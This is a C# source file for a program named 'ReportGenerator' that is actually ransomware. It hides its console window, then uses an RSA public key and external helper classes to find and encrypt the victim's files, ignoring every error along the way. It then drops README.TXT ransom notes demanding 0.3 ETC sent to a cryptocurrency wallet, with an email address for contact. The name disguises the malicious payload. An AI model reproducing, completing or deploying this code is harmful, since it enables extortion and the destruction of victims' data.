using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using Cry;

namespace ReportGenerator;

internal class Program
{
	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private static void Main(string[] args)
	{
		IntPtr consoleWindow = GetConsoleWindow();
		ShowWindow(consoleWindow, 0);
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(4096);
		rSACryptoServiceProvider.ImportCspBlob(Key.Pub);
		List<string> harasmentList = Searcher.GetHarasmentList();
		Console.WriteLine(harasmentList.Count);
		List<string> avilibleHarasmentFiles = Searcher.GetAvilibleHarasmentFiles(harasmentList);
		Console.WriteLine(avilibleHarasmentFiles.Count);
		for (int i = 0; i < avilibleHarasmentFiles.Count; i++)
		{
			Console.Clear();
			Console.WriteLine("{0}/{1}", i, avilibleHarasmentFiles.Count);
			try
			{
				Crypton.EncryptFile(avilibleHarasmentFiles[i], rSACryptoServiceProvider.ExportParameters(includePrivateParameters: false));
			}
			catch (Exception)
			{
			}
		}
		for (int j = 0; j < harasmentList.Count; j++)
		{
			try
			{
				README(harasmentList[j]);
			}
			catch (Exception)
			{
			}
		}
	}

	private static void README(string path)
	{
		string text = "Your privacy files and documents has been ENCRYPTED. Send 0.3 ETC to 0x4d6aE3A1E1f4E5fd7B40f8f62DD46BD56A669635 and communicate with us, using this e-mail: xdfgh34rtj5e@rm3iz7y.cn";
		char[] array = text.ToCharArray();
		byte[] array2 = new byte[array.Length];
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = (byte)array[i];
		}
		File.WriteAllBytes(path + "\\README.TXT", array2);
	}
}
